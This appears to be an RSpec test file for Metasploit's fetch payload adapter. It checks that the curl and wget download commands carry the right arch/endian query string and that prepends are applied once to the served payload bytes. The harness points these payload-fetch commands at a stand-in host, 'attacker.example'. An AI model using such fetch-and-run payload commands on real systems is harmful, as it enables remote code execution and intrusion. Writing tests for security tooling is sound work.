require 'spec_helper'
require 'tempfile'

RSpec.describe Msf::Payload::Adapter::Fetch do
  let(:harness_class) do
    Class.new do
      include Msf::Payload::Adapter::Fetch

      def initialize; end

      def fetch_protocol
        'HTTP'
      end

      def download_uri(_uri)
        'attacker.example:8080/payload_uri'
      end

      def _remote_destination
        '/tmp/payload'
      end

      def _execute_add(get_file_cmd)
        get_file_cmd
      end
    end
  end

  subject(:harness) { harness_class.new }

  # curl and wget both append the same dynamic-arch query string, and it must
  # stay byte-for-byte in sync with what #identify_arch
  # (lib/msf/core/payload/adapter/fetch/server/http.rb) expects to parse back out.
  shared_examples 'a dynamic-arch aware fetch command' do |method|
    it 'omits the arch/endian query string when dynamic_arch is false' do
      cmd = harness.public_send(method, 'payload_uri', false)
      expect(cmd).not_to include('?arch=')
    end

    it 'appends the exact arch/endian query string the fetch HTTP handler expects' do
      cmd = harness.public_send(method, 'payload_uri', true)
      expect(cmd).to include('?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))')
    end

    it 'produces a shell fragment that resolves to a real arch/endian pair when executed' do
      cmd = harness.public_send(method, 'payload_uri', true)
      suffix = cmd[/\?arch=.*\)\)/]

      resolved = Tempfile.create('fetch_endian_probe') do |f|
        f.write("echo #{suffix}\n")
        f.flush
        `sh #{f.path}`.strip
      end

      expect(resolved).to match(/\A\?arch=\S+&endian=[12]\z/)

      query_string = resolved.sub(/\A\?/, '').split('&').each_with_object({}) do |pair, h|
        k, v = pair.split('=', 2)
        h[k] = v
      end
      expect(query_string['arch']).to eq(`uname -m`.strip)
    end
  end

  describe '#_generate_curl_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_curl_command
  end

  describe '#_generate_wget_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_wget_command
  end

  # Regression coverage for the bug fixed by "apply prepends properly in fetch
  # payloads": #generate_complete used to be the inherited
  # `apply_prepends(generate)`, which ran apply_prepends a *second* time over
  # the fetch/wget/curl shell command string returned by #generate (mangling
  # it), while the served payload binary itself never got its prepend stub
  # applied at all. The fix bakes apply_prepends into the two #generate call
  # sites that build the actual payload bytes, and makes #generate_complete a
  # plain passthrough to #generate.
  describe '#generate and #generate_complete' do
    let(:raw_generator) do
      Module.new do
        # Stands in for the underlying stager/stage #generate that Fetch's
        # #generate calls via `super`.
        def generate(_opts = {})
          'RAWBYTES'
        end

        # Stands in for the real Windows/Linux::Prepends#apply_prepends that
        # Fetch's #generate calls via `apply_prepends`.
        def apply_prepends(raw)
          "PREPENDED[#{raw}]"
        end
      end
    end

    let(:generate_harness_class) do
      Class.new do
        def initialize
          @datastore = { 'FETCH_PIPE' => false }
        end

        attr_reader :datastore, :srv_resources

        def module_info
          { 'AdaptedArch' => 'x86', 'AdaptedPlatform' => 'linux' }
        end

        def srvuri
          'test_uri'
        end

        def generate_payload_exe(opts)
          opts[:code]
        end

        def generate_fetch_commands(uri:, dynamic_arch:)
          "CMD(uri=#{uri},dynamic_arch=#{dynamic_arch})"
        end

        def vprint_status(_msg); end
      end
    end

    subject(:harness) do
      generate_harness_class.include(raw_generator).include(Msf::Payload::Adapter::Fetch).new
    end

    describe '#generate' do
      context 'when generating the initial payload (opts[:dynamic_arch] is nil)' do
        it 'applies prepends to the payload bytes before serving them, not to the returned command' do
          cmd = harness.generate

          expect(harness.srv_resources.last[:data]).to eq('PREPENDED[RAWBYTES]')
          expect(cmd).to eq('CMD(uri=test_uri,dynamic_arch=false)')
        end
      end

      context 'when generating the arch-resolved payload for an on-demand dynamic-arch request' do
        it 'applies prepends to the resolved payload bytes' do
          result = harness.generate(dynamic_arch: true, arch: 'mipsle')

          expect(result).to eq('PREPENDED[RAWBYTES]')
        end
      end
    end

    describe '#generate_complete' do
      it 'delegates to #generate without applying prepends a second time' do
        call_count = 0
        allow(harness).to receive(:apply_prepends) do |raw|
          call_count += 1
          "PREPENDED[#{raw}]"
        end

        result = harness.generate_complete

        expect(call_count).to eq(1)
        expect(result).to eq('CMD(uri=test_uri,dynamic_arch=false)')
      end
    end
  end
end
